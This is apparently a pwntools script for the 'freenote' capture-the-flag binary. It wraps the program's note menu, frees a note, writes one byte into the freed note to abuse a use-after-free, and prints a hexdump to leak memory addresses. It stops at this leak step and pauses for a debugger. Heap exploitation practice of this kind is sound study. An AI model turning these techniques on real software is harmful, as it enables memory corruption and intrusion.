#!/usr/bin/env python2.7

from pwn import  *

def menu():
    global r
    r.recvuntil("choice: ")

def add(size, c):
    global r
    menu()
    r.sendline("2")
    r.recvuntil("note: ")
    r.sendline(str(size))
    r.sendline(c*size)

def show(num):
    menu()
    r.sendline("1")
    return r.recvlines(num)

def edit(idx,size,c):
    menu()
    r.sendline("3")
    r.recvuntil("number: ")
    r.sendline(str(idx))
    r.recvuntil("note: ")
    r.sendline(c*size)

def delete(idx):
    menu()
    r.sendline("4")
    r.recvuntil("number: ")
    r.sendline(str(idx))

def main():
    global r
    r=process("./freenote")
    add(0x80,"A")
    add(0x80,"B")
    #add(12,"C")
    delete(0)
    edit(0,1,"\xb8")
    data=show(0)
    print hexdump(data)
    raw_input("[DEBUG]: {}".format(r.proc.pid))


if __name__=="__main__":
    main()
